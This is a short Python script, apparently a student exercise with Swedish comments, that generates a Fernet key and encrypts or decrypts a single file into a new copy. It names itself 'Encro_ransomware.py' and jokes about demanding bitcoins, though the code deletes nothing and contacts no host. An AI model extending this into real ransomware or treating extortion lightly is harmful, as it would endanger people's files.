from cryptography.fernet import Fernet
import argparse
import os

def generate():                                        # generera nyckeln
    key = Fernet.generate_key()
    with open ("mykey.key", "wb") as mykey:
        mykey.write(key)
        print("Key generated and saved as 'mykey.key' in same folder as the script")

def encrypt(filename):                          #kryptera vald fil med genererad nyckel
    try: 
        with open("mykey.key" , "rb") as mykey:
            key = mykey.read()

        cipher = Fernet(key)

        with open(filename, "rb") as original_file:
            original = original_file.read()

        encrypted = cipher.encrypt(original)           
        encrypted_filename = f"enc_{filename}"        #lägger till enc_ på befintligt filnamn och sparar i ny krypterad fil   
        with open(encrypted_filename, "wb") as encrypted_file:
            encrypted_file.write(encrypted)

        print (f"{filename} has been encrypted, and saved in new file as '{encrypted_filename}'. Now demand them bitcoins bro! (don't do that)")
    
    except FileNotFoundError:
        print (f"{filename} not found, check the name of file and make sure its in the correct folder. Example: 'state_secrets.txt'")


def decrypt(filename):                              #dekryptering
    try:
        with open("mykey.key", "rb") as mykey:
            key = mykey.read()

        cipher = Fernet(key)

        with open(filename, "rb") as encrypted_file:
            encrypted = encrypted_file.read()
        
        decrypted = cipher.decrypt(encrypted)           
        decrypted_filename = f"dec_{filename}"
        with open(decrypted_filename, "wb") as decrypted_file:
            decrypted_file.write(decrypted)

        print (f"File has been decrypted and saved in new file '{decrypted_filename}'.")

    except FileNotFoundError:
        print (f"{filename} not found,check the name of file and make sure its in the correct folder. Example: 'state_secrets.txt'")



def main():
    parser = argparse.ArgumentParser(description="Generate a key for encryption, encrypt a file and decrypt it. (used ethically ofcourse ;) )")
    parser.add_argument("filename", help="Name on the file you want to encrypt or decrypt")
    parser.add_argument("-o", "--operation", choices=["generate", "encrypt", "decrypt"], required=True, help = "choose one operation")
    parser.add_argument("-v", "--version", action="version", version="Encro_ransomware.py Version 1.0")


    args = parser.parse_args()

    key_exist = "mykey.key"                 #se till att användaren har skapat nyckeln först


    if args.operation == "generate":
        generate()

    elif args.operation =="encrypt":
        if not os.path.isfile(key_exist):       #kollar om mykey.key finns annars ber anv att generera nyckeln
            print("Bro, you need to genereate a key first. Use command '-o generate' to create a key.")
        encrypt(args.filename)

    elif args.operation == "decrypt":
        decrypt(args.filename)


if __name__ == "__main__":
    main()